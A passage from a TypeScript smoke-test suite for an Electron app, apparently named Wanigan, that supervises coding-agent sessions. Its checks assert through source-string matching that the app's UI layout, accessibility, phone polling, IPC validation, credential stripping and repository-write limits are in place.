    && sessionsSrc.includes('SESSION_PICKER_COMPACT_QUERY')
    && sessionsSrc.includes('sessions--picker-open')
    // The two rail breakpoints are measured on the view, not the window, and
    // the stylesheet keys off the class that measurement sets. A window-width
    // media query and a view-width measurement disagree at every width where
    // the destination list is open, which would leave a rail aria-hidden and
    // still on screen as a first column.
    && sessionsSrc.includes('new ResizeObserver(measure)')
    && sessionsSrc.includes('SESSION_PICKER_COMPACT_WIDTH')
    && sessionsSrc.includes('ref={sessionsBoxRef}')
    && !sessionsCssSrc.includes('@media (max-width: 860px)')
    && !cssSrc.includes('.sessions { grid-template-columns: 248px 1fr;')
    && cssSrc.includes('grid-template-columns: clamp(184px, 22%, 248px)')
    && sessionsCssSrc.includes('sessions--picker-open .session-rail')
    && sessionsCssSrc.includes('.session-picker-scrim')
    && sessionsCssSrc.includes('@media (pointer: coarse)')
    && compactCssSrc.includes('@media (max-width: 720px)')
    && mobileSrc.includes('const interactive = remoteControlEnabled && session.status !== \'exited\';')
    && mobileSrc.includes('id="monitor-note"')
    && mobileSrc.includes('if (!remoteControlEnabled) {'),
  'tablet sessions keep the terminal full width behind an accessible picker while document surfaces reflow instead of clipping or silently offering unavailable remote controls');

  say('── Recent conversations · its own read, its own failure, its own note');

  // The negative that fails if this split is ever reverted or dropped: the
  // literal shape of the old shared try is what let a SQLite error inside
  // pastSessions() take every live terminal off screen.
  const oldSharedPastRead = 'setSessions(await window.wanigan.sessions.list());\n      setPast(await window.wanigan.sessions.past());';
  check(sessionsSrc.includes('const refreshPast = useCallback(async () => {')
    && sessionsSrc.includes('const [pastErr, setPastErr] = useState<string | null>(null);')
    && sessionsSrc.includes('await refreshPast();')
    && !sessionsSrc.includes(oldSharedPastRead),
  'the Recent conversations read and the live session list read are two callbacks with two failure states, and the Recent read is awaited after the session-list try block closes rather than inside it, so a SQLite error in pastSessions() can no longer unmount every live terminal, tab and composer behind a heading that says the session list did not load',
  sessionsSrc.includes(oldSharedPastRead));

  check(sessionsSrc.split('setPastErr(null)').length - 1 >= 3
    && sessionsSrc.includes("action={{ label: 'Retry', run: refreshPast }}")
    && sessionsSrc.includes('Recent conversations did not load:')
    && !sessionsSrc.includes("Running sessions are unaffected — this is Wanigan's own record of them"),
  'all three paths that successfully re-read Recent — the refresh, a pin or settle, and a forget — clear its failure flag, so a retry that worked stops showing the error, and the reassurance that running sessions are untouched now sits on the note describing the read it was always about rather than on a view-wide heading it never applied to',
  sessionsSrc.split('setPastErr(null)').length - 1);

  say('── Recent conversations · the ninth row is reachable, and what is hidden is counted');

  check(sessionsSrc.includes('activePast.slice(0, activeShown)')
    && !sessionsSrc.includes('activePast.slice(0, 8)')
    && sessionsSrc.includes('{activePast.length - activeShown} not shown')
    && sessionsSrc.includes('{settledPast.length - settledShown} not shown')
    && sessionsSrc.split('rail-more').length - 1 >= 2
    && /'views\/Sessions\.tsx': 125,/.test(styleGateSrc),
  'both bands of Recent conversations page rather than truncate, each control states the rows still hidden as a subtraction over the array that render already holds rather than as an estimate or a bare button, the two controls share one class instead of two inline style objects that could drift apart, and the inline-style debt that paydown settled was recorded in the gate rather than left as headroom for the next regression',
  sessionsSrc.split('rail-more').length - 1);

  // Three files have to agree about one number, and only one of them defines
  // it. Raising main's cap without touching the view fails here rather than
  // printing a stale forty at the operator.
  check(sessionsSrc.includes('const PAST_ACTIVE_CAP = 40;')
    && sessionsMainSrc.includes('export function pastSessions(limit = 40): PastSession[] {')
    && mainSrc.includes("handle('sessions:past', () => pastSessions());")
    && sessionsSrc.includes('does not report how many are older')
    && !/Wanigan lists (?:all|every)/.test(sessionsSrc),
  'the cap the renderer prints is the number main actually defaults to and the number the IPC handler actually passes, and the sentence names that cap while explicitly declining to count what sits behind it — a PastSession[] of forty cannot say whether forty-one were recorded, so the renderer states the limit rather than inventing a total',
  sessionsSrc.includes('const PAST_ACTIVE_CAP = 40;'));

  const railMoreRules = sessionsCssSrc.slice(sessionsCssSrc.indexOf('.sessions-view .rail-more {'),
    sessionsCssSrc.indexOf('@media (pointer: coarse)'));
  check(sessionsCssSrc.includes('.sessions-view .rail-more {')
    && sessionsCssSrc.includes('.sessions-view .rail-cap-note {')
    && railMoreRules.length > 0
    && !/[0-9]+px/.test(railMoreRules)
    && !/#[0-9a-fA-F]{3,8}|rgb\(|hsl\(/.test(railMoreRules)
    && sessionsCssSrc.indexOf('.sessions-view .rail-more {') < sessionsCssSrc.indexOf('@media (pointer: coarse)'),
  'the two new rail rules spell every size, radius and space as a token rather than a px literal or a colour, and sit above the coarse-pointer block rather than inside it — two-class selectors placed after it would have beaten that block’s one-class rule and silently taken the 44px finger target away from the only controls on that surface a thumb has to hit',
  railMoreRules.length);

  say('── launch · two agents in one checkout is stated before the launch, not after the merge');

  // The launch gate, start to finish. `sharing` appearing anywhere in it would
  // mean the warning had become a refusal.
  const launchGateSlice = dialogSrc.slice(dialogSrc.indexOf('const blocker = list.length === 0'),
    dialogSrc.indexOf('const elevated = !!trust && !!trustDefault'));
  check(dialogSrc.includes("liveSessions.filter((s) => s.status !== 'exited' && (s.worktree ?? s.projectPath) === root)")
    && dialogSrc.includes('{sharing.length > 0 && !isolate && (')
    && dialogSrc.includes('it does not watch what they write')
    && dialogSrc.includes('if (blocker || busy) return;')
    && launchGateSlice.length > 0
    && !launchGateSlice.includes('sharing')
    && !/another agent is editing|agents? (?:is|are) editing this checkout/i.test(dialogSrc),
  'the shared-checkout warning counts live sessions by the directory they actually run in — worktree when they have one, project path when they do not, the same expression sessions.ts uses to pick a cwd — so an isolated session on the same project does not raise it; it says in the same breath that Wanigan does not watch file writes rather than upgrading an observed session into a claim about edits; and the word sharing appears nowhere between the blocker expression and the end of go(), so it warns and can never refuse a launch the operator has a reason for',
  launchGateSlice.includes('sharing'));
  // The private chip families in compact.css's coarse block had a 40px finger
  // target; .chip and .seg button, the shared primitives the house style tells
  // every new view to compose, did not — so adopting the primitive shrank the
  // target to 26px and 22px and following the rule made the surface worse.
  // This reads the rule rather than the rendering because no surface Wanigan
  // ships matches (pointer: coarse) yet: the iPad page is HTML mobile.ts
  // builds itself, not this bundle, so there is nothing to measure.
  const coarseRule = compactCssSrc.slice(compactCssSrc.indexOf('@media (pointer: coarse)'))
    .split('\n').find((line) => line.includes('min-height: 40px')) ?? '';
  check(compactCssSrc.includes('@media (pointer: coarse)')
    && /(^|[\s,])\.chip,/.test(coarseRule)
    && /(^|[\s,])\.seg button,/.test(coarseRule)
    && !compactCssSrc.includes('.fleet-seg'),
  'the shared chip and segmented primitives carry the same coarse-pointer target as the private chip families beside them, and compact.css no longer sizes the .fleet-seg pair no .tsx renders');
  // 'No session panes are open' is a claim about the Mac, and the page used to
  // make it whenever the session array was empty — including on a device that
  // had never heard from the Mac at all, which is how a closed lid and an idle
  // fleet came to look the same. The claim is now gated on a poll that actually
  // returned, and the retry backs off instead of waking a phone radio every
  // three seconds against a Mac that cannot answer.
  check(mobileSrc.includes('const observed = lastGoodAt > 0 && lastSessionCount === 0;')
    && !mobileSrc.includes("byId('empty').classList.toggle('hidden', sessions.length !== 0)")
    && mobileSrc.includes('pollDelay = Math.min(POLL_SLOW_MS, pollDelay * 2);')
    && mobileSrc.includes('pollDelay = POLL_FAST_MS;')
    && !mobileSrc.includes('setInterval(() => { void poll(); }, 3000)'),
  'the phone page only claims an empty fleet about a poll that returned, and steps its retry out to a ceiling while the Mac is not answering');
  // The widening is a property of the route table, not of any handler. Two
  // things keep that meaning something: the dispatcher is where a 'repo' route
  // is refused, and mobile/git.ts holds no second copy of the condition that
  // could drift out of step with it. The count is the point — 'which routes can
  // put a file path on a phone' has to stay answerable by grep.
  // The negative that matters most on this whole surface. `git commit -a` is
  // tracked-only by construction rather than by a filter anyone could edit, and
  // the way to keep that true is to have no other write imported at all.
  check(mobileSrc.includes("import { commit as gitCommit, runGit, status, type GitFile, type GitStatus } from '../git';")
    && mobileSrc.includes('await gitCommit(project.path, message.message, { all: true });')
    && !mobileSrc.includes("'-A'")
    && !/\bstage\(|\bdiscard\(|\bcheckout\(|gitPush|push\(project/.test(mobileSrc)
    && mobileSrc.includes('pushed: false'),
  'the only repository write a phone can reach is `git commit -a`: the mobile surface imports no stage, discard, checkout or push from ../git, never passes -A, and says in the answer itself that nothing was pushed');
  const repoScopedRoutes = (mobileSrc.match(/scope: 'repo', handler:/g) ?? []).length;
  check(mobileSrc.includes("export type MobileApiScope = 'monitor' | 'control' | 'repo';")
    && mobileSrc.includes("if (route.scope === 'repo' && !repoScopeAllowed()) {")
    && mobileSrc.includes('registerRepoGate(repoReviewAllowed);')
    // Five now, not three: the gate and the commit joined this scope, and they
    // are the first WRITES on it. That is the deliberate friction — a widening
    // of the set that can put a path or a hunk on a phone, or do something to a
    // repository, has to be typed here by hand before the suite goes green.
    && repoScopedRoutes === 5
    && !mobileSrc.includes('if (!repoReviewAllowed())'),
  'the repository-review widening is enforced by the dispatcher’s declared scope rather than by a condition inside a handler, so the routes that can send a file path stay enumerable',
  `${repoScopedRoutes} repo-scope routes`);
  // The third repo-scope read is the one that carries source lines rather than
  // only paths, and the two POSTs beside it are the only writes; the count above
  // has to move with all of them, because 'what may a phone be shown of a
  // repository, and what may it do to one' stays answerable by grep only while
  // the number in this suite is the number in the route table.
  const repoScopedRouteLines = (mobileSrc.match(/scope: 'repo', handler:/g) ?? []).length;
  check(repoScopedRouteLines === 5
    && mobileSrc.includes("registerApiRoute({ path: '/api/repo/file', method: 'GET', scope: 'repo'")
    && mobileSrc.includes("registerApiRoute({ path: '/api/repo/gate', method: 'POST', scope: 'repo'")
    && mobileSrc.includes("registerApiRoute({ path: '/api/repo/commit', method: 'POST', scope: 'repo'")
    && !mobileSrc.includes('if (!repoReviewAllowed())'),
  "one file's diff and the two repository writes are declared on the dispatcher's repo scope like the reads beside them, so everything that can send a file path or its contents, or change a repository, stays enumerable",
  `${repoScopedRouteLines} repo-scope routes`);
  // A mark is a glyph and a number wide, with nowhere to print 'as of eleven
  // minutes ago' — so when the Mac stops answering it leaves rather than keeps
  // a count nothing is confirming any more. The dashboard behind it may go on
  // showing its dated reading because it says in words how old that is; the
  // nav cannot, and this is the same rule the empty fleet already follows.
  // Both hooks are named because render() alone cannot enforce it: a poll that
  // fails never renders, so the freshness pass is the only thing that ever
  // learns the Mac went quiet. And neither may become a second cadence — one
  // radio, one poll.
  check(mobileSrc.includes("const live = navMarksFollowThePoll && navReading !== null && lastGoodAt > 0 && connectionState === 'connected';")
    && mobileSrc.includes("mark.classList.toggle('hidden', total <= 0);")
    && mobileSrc.includes('render = (snapshot) => { renderWithoutMarks(snapshot); navMarks(snapshot); };')
    && mobileSrc.includes('applyFreshness = () => { freshnessWithoutMarks(); navMarks(null); };')
    && mobileSrc.includes('.nav-mark.hidden { display:none; }')
    && !/setInterval\([^;]*navMarks/.test(mobileSrc),
  'a nav mark disappears when the Mac stops answering instead of printing a count it can no longer confirm, and it follows the poll the page already makes rather than a cadence of its own');
  // The bar's Fleet mark is the same claim as the tile behind it, made where
  // it can be read without opening the screen — so it sums the same three
  // kinds the desktop calls NEEDS_YOU and wears the glyph of the worst one
  // present. The order is load-bearing, not cosmetic: spec.kinds.find() picks
  // the glyph, so a list reordered here would show '✓' over a fleet whose real
  // answer is '?'. A fourth kind, or the desktop's list moving without this
  // one, would send someone to a screen whose own headline disagreed with the
  // number that sent them.
  check(appSrc.includes("const NEEDS_YOU: AttentionKind[] = ['permission', 'error', 'finished'];")
    && appSrc.includes("permission: '?', error: '✕', finished: '✓', idle: '◦', working: '▸',")
    && mobileSrc.includes("{ id: 'fleet', label: mobileViewLabel('fleet'), kinds: ['permission', 'error', 'finished'], word: 'need you' },")
    && mobileSrc.includes('const total = live ? spec.kinds.reduce((sum, kind) => sum + (navReading[kind] || 0), 0) : 0;')
    && mobileSrc.includes("const worst = total > 0 ? spec.kinds.find((kind) => (navReading[kind] || 0) > 0) : '';")
    && mobileSrc.includes("const NAV_GLYPH = { permission: '?', error: '✕', finished: '✓', running: '▸' };"),
  'the phone nav sums the same three attention kinds the desktop calls NEEDS_YOU and wears the same glyph for the worst one, so the mark and the Needs-you tile behind it cannot disagree about who is waiting');
  check(/setSessionExitObserver/.test(mainSrc) && /exitObserver\?\./.test(sessionManagerSrc),
    'PTY exits reach the notification classifier even for providers with no hook bus');
  check(/tui\.notifications=/.test(sessionManagerSrc) && /scanCodexNotifications/.test(sessionManagerSrc)
    && /recordProviderEvent/.test(sessionManagerSrc),
  'Codex interactive turns expose approval and completion transitions without editing global config');
  check(/handle\(\s*'sessions:recoverExactCodex'/.test(mainSrc)
    && /recoverExactCodex:\s*\(/.test(preloadSrc)
    && sessionsSrc.includes('Recover exact Codex UUID…')
    && sessionManagerSrc.includes('recoverExactCodexThread')
    && sessionManagerSrc.includes('validateExactCodexThread(conversationId, project.path)')
    && sessionManagerSrc.includes('assertCodexThreadWriterUnlocked(conversationId)')
    && sessionManagerSrc.includes("JSON.stringify(['resume', conversationId])")
    && sessionManagerSrc.includes('recoveryBootstrapReady')
    && sessionManagerSrc.includes('if (!exactRecovery) {\n    try {\n      recordSessionHistory();'),
  'exact Codex recovery has its own UUID/project IPC, validates state plus CWD, checks the live writer before spawn, and delays Recent history until bootstrap succeeds');
  check(/sandbox:\s*true/.test(mainSrc) && /will-navigate/.test(mainSrc) && /trustedSender/.test(mainSrc),
    'the desktop shell is sandboxed, refuses renderer navigation and validates IPC senders');

  // ── the allowlist is not renderer-supplied ──────────────────────────
  // roots.ts builds managedRoots() from the projects table and says so: "Both
  // come from this process's own records, never from the caller." projects:add
  // took a bare path from the renderer and inserted it, and addProject refuses
  // only a subdirectory of a repo — so one call naming a home directory
  // registered a root, and every later assertManagedRoot succeeded beneath it.
  // The answer is not a confirmation dialog: on macOS that is a window-modal
  // sheet, and the headless screenshot run has nobody to dismiss it, so the
  // run hangs instead of failing. It is a launch marker the page cannot reach.
  const automationSrc = sourceOf('src/main/automation.ts');
  check(automationArgv([]) === false
    && automationArgv(['.', '--user-data-dir=/tmp/x']) === false
    && automationArgv(['--wanigan-automation']) === true
    && AUTOMATION_ARGV === '--wanigan-automation'
    && automationRun() === false,
  'automation mode is an explicit launch marker rather than a mode the app can drift into: an argv without it parses false, an argv with it parses true, and this very smoke process — launched by scripts/smoke.sh without the marker — reports false, so the raw project channel answers it with a refusal',
    JSON.stringify({ live: automationRun(), argv: process.argv.slice(1) }));
  check(automationSrc.includes('!app.isPackaged && automationArgv(argv)')
    && !automationSrc.includes('process.env'),
  'an installed Wanigan refuses the automation marker however it was launched, because the gate is conjoined with !app.isPackaged and reads no environment variable that a parent process could set for it');
  check(mainSrc.includes("handle('projects:add', (dir: unknown) => {")
    && mainSrc.includes('if (!automationRun()) {')
    && mainSrc.includes("throw new Error('Wanigan registers a project from its own folder picker, not from a path the interface names. Use Add project.');")
    && mainSrc.includes('return addProject(path.resolve(dir));')
    && !mainSrc.includes("title: 'Add this directory as a project?'")
    && !mainSrc.includes("handle('projects:add', (dir: string) => addProject(dir));"),
  'the validated allow-list every other guard reads cannot be widened by the renderer: projects:add refuses before it even looks at the path unless this process was launched for automation, which leaves the main-process folder picker as the operator’s only route to registering a root');
  check(sourceOf('scripts/shots.mjs').includes("'--wanigan-automation'")
    && sourceOf('CONTRIBUTING.md').includes('`--wanigan-automation`')
    && !sourceOf('scripts/smoke.sh').includes('--wanigan-automation'),
  'the one caller that still needs a raw path is the screenshot run, it launches with the marker, CONTRIBUTING.md says so where it tells a contributor to run it — and the smoke launcher deliberately does not, because every suite registers its projects as a module call rather than over IPC',
    sourceOf('scripts/shots.mjs').includes("'--wanigan-automation'"));
  // Four handlers that took the renderer's word while every sibling in the same
  // block validated first. assertManagedRoot is typed (root: unknown), so the
  // String() wrappers on the worktree pair were noise that turned a symbol into
  // a TypeError naming nothing; browse:reveal keeps its coercion because
  // assertOpenablePath is still typed (target: string).
  check(mainSrc.includes("worktrees.listWorktrees(assertManagedRoot(repoRoot, 'That repository'))")
    && mainSrc.includes("worktrees.worktreeStatus(assertManagedRoot(p, 'That worktree'))")
    && mainSrc.includes("browse.revealInFinder(assertOpenablePath(String(p)))")
    && mainSrc.includes("plugins.details(pluginId(name))")
    && !/handle\('worktrees:list', \(repoRoot: string\) => worktrees\.listWorktrees\(repoRoot\)\)/.test(mainSrc)
    && !/handle\('browse:reveal', \(p: string\) => browse\.revealInFinder\(p\)\)/.test(mainSrc),
  'reading a worktree, revealing a path in the Finder and asking about a plugin all validate the renderer’s argument, like every other handler beside them');
  // The plugin file reader was a hand-rolled backdrop inside the pane: it
  // announced role="dialog" aria-modal="true" over markup that answered no
  // key, trapped no focus and portalled nowhere, so it painted under the
  // header and Escape did nothing. It is a component now, mounted only while
  // there is a file to read — useDialog raises the shell's modal flag on
  // mount, so calling the hook from Plugins() itself would switch off the
  // digit chords, ⌘K and ? for as long as the view is open while the reader
  // still answered nothing.
  const pluginsViewSrc = sourceOf('src/renderer/src/views/Plugins.tsx');
  check(pluginsViewSrc.includes("import { useDialog } from '../components/useDialog';")
    && /\{reading && \(\s*<ReaderDialog /.test(pluginsViewSrc)
    && pluginsViewSrc.includes("useDialog<HTMLDivElement>({ onClose, initialFocus: 'least-destructive' })")
    && pluginsViewSrc.includes('<div {...backdropProps} className="overlay-backdrop pg-reader">')
    && pluginsViewSrc.includes('<div {...dialogProps} className="pg-reader-in" aria-label={title}>')
    && pluginsViewSrc.includes('<div className="pg-reader-b" tabIndex={0}>{text}</div>')
    && !/aria-modal="true"/.test(pluginsViewSrc),
  'the plugin file reader is a useDialog dialog mounted only while a file is open — Escape, a focus trap that includes the scrollable body, and a portal out of .body — instead of a hand-rolled backdrop that claimed aria-modal and answered no key');
  check(mainSrc.includes("handle('settings:setSpendCap', (v: unknown) => {")
    && mainSrc.includes("if (!Number.isFinite(cap) || cap < 0) throw new Error('A spend cap must be a number of dollars, zero or more.');")
    && mainSrc.includes('cap > 100_000'),
  'the spend cap — the one control between a mistyped batch and a runaway bill — refuses a value that is not a number of dollars instead of writing it and reading back the default');

  // A pack that redirects the Anthropic API must not carry the operator's own
  // Anthropic credential to the host it chose. The name-based strip exempted
  // any name the profile declared, and a manifest can declare a process-source
  // read of the ambient key under any destination — including its own name.
  check(sessionManagerSrc.includes('const ambient = new Set(')
    && sessionManagerSrc.includes('if (ambient.has(value.trim())) delete out[key];')
    && sessionManagerSrc.includes('ANTHROPIC_AMBIENT_KEYS'),
  'the ambient Anthropic credential is stripped from a redirected session by value, so a pack cannot re-export it under a name the strip exempts');
  check(/capabilitiesFor/.test(providerSrc) && /--help/.test(providerSrc),
    'provider capabilities are probed from the installed CLI rather than inferred only from a static table');
  check(/isDaemonInvocation/.test(mainSrc) && /LaunchAgents/.test(daemonSrc),
    'the optional macOS scheduler is a windowless app daemon, not a timer that dies with the window');
  check(/handle\(\s*'review:run'/.test(mainSrc) && /review_runs/.test(reviewSrc),
    'review gates keep command evidence in a durable record, not only in a terminal scrollback');
  const browseSrc = sourceOf('src/main/browse.ts');
  const attachmentsSrc = sourceOf('src/main/attachments.ts');
  check(/rememberPicked\(res\.filePaths\)/.test(browseSrc)
    && /rememberPicked\(\[res\.filePaths\[0\]\]\)/.test(browseSrc)
    && (browseSrc.match(/rememberPicked\(/g) ?? []).length === 3
    && attachmentsSrc.includes('if (!isPickedPath(abs)) {'),
    'the record attach:add checks is written only by the two calls that put a native dialog in front of a person, never by browse.browse(), whose unconfined readdir would hand back exactly what the check refuses',
    (browseSrc.match(/rememberPicked\(/g) ?? []).length);
  check(/review\.saveRecipeWithConsent\(win, projectId, commands\)/.test(mainSrc)
    && !/review\.saveRecipe\(projectId, commands\)/.test(mainSrc)
    && reviewSrc.indexOf('dialog.showMessageBox') > 0
    && reviewSrc.indexOf('dialog.showMessageBox') < reviewSrc.indexOf('export async function runAt'),
    'saving a review recipe asks the person and running one does not, because the stored text is written once and run many times from both review:run and a goal’s verify task, so the consent sits where the capability is made rather than on each use of it',
    /review\.saveRecipeWithConsent\(win, projectId, commands\)/.test(mainSrc));
  check(/handle\(\s*'control:create'/.test(mainSrc) && /control:\s*\{/.test(preloadSrc)
    && /<Control/.test(appSrc) && /Dockets/.test(controlViewSrc) && controlSrc.includes('work_dockets'),
    'the durable control plane has schema, IPC, renderer binding and a visible operator surface');
  // control.ts kept its own DEFAULT_PLAN and NODE_KINDS until the renderer
  // needed to seed a plan editor from them. A reintroduced local copy would
  // read as identical on the day it was written and drift on every day after,
  // so this fails on the declaration returning, not merely on the name.
  check(controlSrc.includes('DEFAULT_DOCKET_PLAN') && controlSrc.includes('DOCKET_NODE_KINDS')
    && !/^const DEFAULT_PLAN\b/m.test(controlSrc) && !/^const NODE_KINDS\b/m.test(controlSrc),
    'control.ts reads the shared default plan and node kinds rather than keeping a second copy that can drift');

  // 'docket' is the schema word and nothing else now. Every refusal, launch
  // prompt and halt reason control.ts can put in front of an operator says
  // 'goal' — what Control, the palette and the MCP tools all call the record.
  // This scans the literals rather than listing today's sentences, because the
  // regression it guards against is a NEW sentence arriving in the old
  // vocabulary; the tables and columns it is built on are exempt by name.
  const docketProse = (controlSrc.match(/"[^"\n]*"|'[^'\n]*'|`[^`\n]*`/g) ?? [])
    .filter((text) => /docket/i.test(text) && !/work_dockets|docket_id|listDockets/.test(text));
  check(docketProse.length === 0,
    'no sentence control.ts hands an operator calls a goal a docket; the word survives only as the tables and columns underneath it',
    docketProse);

  // Control's goal header once copied `file:///…#goal=<id>` under the notice
  // "Opening it in Wanigan returns to this exact durable goal". Nothing in
  // src/main registers a URL scheme and the app has no address bar, so that
  // address resolved in a browser or nowhere: a copy affordance promising a
  // door the app never built. These two read the source because the smoke
  // process has no renderer to click. The first pins the clipboard write and
  // the sentence beside it to the same subject; the second keeps the URL from
  // coming back under any of its old names.
  const copyGoalAt = controlViewSrc.indexOf('const copyGoalId =');
  const copyGoalBlock = copyGoalAt < 0 ? '' : controlViewSrc.slice(copyGoalAt, copyGoalAt + 500);
  check(copyGoalBlock.includes('await copyText(id);')
    && copyGoalBlock.includes('Goal ID copied.')
    && !copyGoalBlock.includes('goalHash(')
    && !copyGoalBlock.includes('window.location.href')
    && controlViewSrc.includes('>Copy goal ID<'),
    'Control puts the goal id on the clipboard, and the button and the notice beside it name that same id rather than describing something the app did not copy');
  check(!/Copy goal link|Goal link copied|copyGoalLink|>Goal link</.test(controlViewSrc)
    && !/copyText\(\s*(?:url\b|`)/.test(controlViewSrc)
    && !controlViewSrc.includes('window.location.href.split'),
    'no copy affordance in Control offers a goal URL, because Wanigan registers no URL scheme and cannot open one back');

  // mapNodes() reports 'blocked' for two different situations — a prerequisite
  // that failed or was canceled, and one that has not finished yet — and the
  // operator's answer differs: reopen the first, wait out the second. The card
  // therefore names each prerequisite beside its own status mark, and the guide
  // no longer teaches the default chain as though every graph were
  // plan → implement → verify → review. Source contract because the smoke
  // process has no renderer to look at.
  const controlCssSrc = sourceOf('src/renderer/src/styles/control.css');
  check(controlViewSrc.includes('prereqs: { title: string; status: DocketNodeStatus }[]')
    && /prereqs=\{node\.dependsOn\.map\(/.test(controlViewSrc)
    && controlViewSrc.includes('className="control-node-waits">Waits on ')
    && /prereqs\.map\(\(prereq, index\) => \{ const mark = markOf\(prereq\.status\)/.test(controlViewSrc)
    && controlCssSrc.includes('.control-node-waits {')
    && !controlViewSrc.includes('Start <em>Plan</em> first.'),
    'every task card names the prerequisites it waits on and how each one stands, so a blocked task reads as "reopen that one" or "wait for that one" rather than a single ambiguous word');

  // Control was the only view whose scroll container floated in the middle of a
  // wide window. control.css capped .control-view at 1500px and centred it with
  // margin: 0 auto, while index.css was already capping Control's *children* at
  // --page-wide. The private rule sat on the container, so it also ate the two
  // 24px page gutters and the content column it was meant to protect never got
  // past 1452px. The container rule is gone; the class on the view is not, and
  // must not be, because .pane.control-view > * is the selector that carries the
  // cap now and dropping the class would silently remove it. Comments are
  // stripped before the test — the prose left above the deleted rule still names
  // 1500px, and matching that would pass a re-added declaration. Source contract
  // because the smoke process has no renderer to measure.
  const controlCssRules = controlCssSrc.replace(/\/\*[\s\S]*?\*\//g, '');
  check(!/\.control-view\s*\{[^}]*max-width/.test(controlCssRules)
    && !/\.control-view\s*\{[^}]*margin:\s*0 auto/.test(controlCssRules)
    && cssSrc.includes('.pane.control-view > *, .pane.set > *, .pane.wide > * { max-width: var(--page-wide); }')
    && controlViewSrc.includes('className="pane control-view"'),
    'Control is held flush left at --page-wide by the shared .pane rule every document surface uses, not centred by a private 1500px cap of its own');

  // The three checks below close the gaps the assertion above leaves. It pins
  // that the private cap is gone; these pin the reasons deleting it was safe,
  // because every one of those reasons is a fact about a *different* file and
  // any of them can be changed by someone who never opens control.css.
  const compactSheet = sourceOf('src/renderer/src/styles/compact.css');
  check(/\.control-grid/.test(controlCssRules)
    && !/@media \(max-width: 980px\)[^}]*\.control-view\s*\{[^}]*padding/.test(controlCssRules)
    && /\.pane \{ padding: var\(--s-4\); \}/.test(compactSheet),
    'Control spells no gutter of its own at the 980px shelf and takes the same --s-4 step compact.css gives every other .pane there, so the two cannot drift apart',
    `control shelf rules ${/\.control-grid/.test(controlCssRules)}`);

  // Every "the shared rule already won" argument in control.css's header comment
  // is an argument about source order, and source order here is two imports in
  // main.tsx plus one @import in index.css. Swap either and the private rules
  // this phase deleted would have been the winners all along — which means the
  // comment would have been wrong rather than the code.
  const mainEntrySrc = sourceOf('src/renderer/src/main.tsx');
  check(mainEntrySrc.indexOf("import './index.css';") >= 0
    && mainEntrySrc.indexOf("import './index.css';") < mainEntrySrc.indexOf("import './styles/compact.css';")
    && cssSrc.indexOf("@import './styles/control.css';") < cssSrc.indexOf('\n.pane {'),
    'compact.css loads after index.css and control.css is imported above the .pane rule, which is the whole reason a private .control-view declaration lost to .pane at equal specificity instead of winning',
    `index<compact ${mainEntrySrc.indexOf("import './index.css';") < mainEntrySrc.indexOf("import './styles/compact.css';")}`);

  // .pane must never grow a max-width or a margin of its own. If it does, a
  // document surface stops being capped on its children and starts being capped
  // — or centred — as a container, which is the exact shape of the bug deleted
  // out of control.css.
  const paneBlock = /\n\.pane \{([^}]*)\}/.exec(cssSrc.replace(/\/\*[\s\S]*?\*\//g, ''))?.[1] ?? '';
  check(paneBlock.includes('display: flex')
    && !paneBlock.includes('max-width')
    && !paneBlock.includes('margin'),
    'the shared .pane rule sets the flex column and the gutter but never a max-width or a margin, so a document surface is capped on its children and never centred as a container',
    `pane block ${paneBlock.trim().slice(0, 60)}`);

  // A comment that still says Control is not a .pane, or that a centred maximum
  // width is Control's own, describes a sheet that no longer exists. This repo
  // treats that as worse than no comment, so the prose is pinned too.
  check(!controlCssSrc.includes("Only the centred maximum width is Control's own")
    && !controlCssSrc.includes('Control is not a .pane'),
    'control.css prose describes the sheet that exists rather than the two private rules deleted out of it, and no comment still claims a centred width or a pane Control is not');

  // .btn-small in control.css and .skills-btn-sm in evals.css each declared only
  // padding, font-size and border-radius, and index.css's own .btn redeclares all
  // three at equal specificity from later in the same built stylesheet — both
  // sheets are @imported at the top of index.css, so in the bundle the two private
  // rules land ahead of .btn and lost every declaration they made. Nine buttons
  // carried a class that promised a small button and rendered a full 32px one.
  // They are deleted rather than repointed at .btn-sm, because shrinking a control
  // is a design decision and this was a cleanup. Comments are stripped before the
  // scan so prose explaining the removal cannot fail it, and the scanned file
  // count is asserted so an empty walk cannot pass by looking at nothing. Source
  // contract because the smoke process has no renderer to measure a button in.
  const withoutComments = (text: string): string => text
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/^\s*\/\/.*$/gm, '');
  const rendererSources = filesUnder(path.join(appRoot(), 'src/renderer/src'))
    .filter((file) => /\.(?:tsx?|css)$/.test(file));
  const deadButtonClass = /\b(?:btn-small|skills-btn-sm)\b/;
  const stillNamingOne = rendererSources
    .filter((file) => deadButtonClass.test(withoutComments(fs.readFileSync(file, 'utf8'))))
    .map((file) => path.relative(appRoot(), file));
  check(rendererSources.length > 40
    && stillNamingOne.length === 0
    && !/\.btn-small\s*\{/.test(withoutComments(sourceOf('src/renderer/src/styles/control.css')))
    && !/\.skills-btn-sm\s*\{/.test(withoutComments(sourceOf('src/renderer/src/styles/evals.css'))),
    'no renderer source claims a .btn-small or .skills-btn-sm button, and neither sheet declares one, because neither class ever moved a pixel: .btn redeclares padding, font-size and border-radius from later in the same stylesheet',
    stillNamingOne);

  // Opening a goal's session unmounts Control, and the status filter used to be
  // component-local state: narrow the list to one status, press a task's Start,
  // come back, and the list had widened to every goal with nothing having said
  // so. That reads as goals changing status while the operator was away. The
  // filter is view memory now. Source contract because the smoke process has no
  // renderer to swap tabs in.
  check(controlViewSrc.includes("useViewMemory<string>('statusFilter', 'all')")
    && /import \{ useViewMemory \} from '\.\.\/components\/viewMemory';/.test(controlViewSrc)
    && !/const \[statusFilter, setStatusFilter\] = useState/.test(controlViewSrc)
    && controlViewSrc.includes("onToggle={() => setStatusFilter('all')}"),
    'Control remembers which status the goal list is filtered to across a tab swap, instead of silently widening to every goal when the operator comes back from a session');

  // Two sentences in Control described writes the main process never made. The
  // completion notice ran the decision enum through replace('_', ' '), so a
  // reviewer asking for changes read "Task marked request changes." and an
  // operator finishing a plan task was told a decision had been recorded —
  // completeNode only stores a `decision` proof for a review node. And a goal
  // with no base commit rendered "base not a git repo", which diagnoses one
  // cause of several: gitHead also returns null for a repository with no commit
  // yet, or a git read that failed. Source contract because the smoke process
  // has no renderer to read a notice in.
  check(/function decisionNotice\(kind: DocketNodeKind, decision: /.test(controlViewSrc)
    && controlViewSrc.includes('}, decisionNotice(node.kind, decision));')
    && controlViewSrc.includes("if (decision === 'approve') return 'Decision recorded: approved.';")
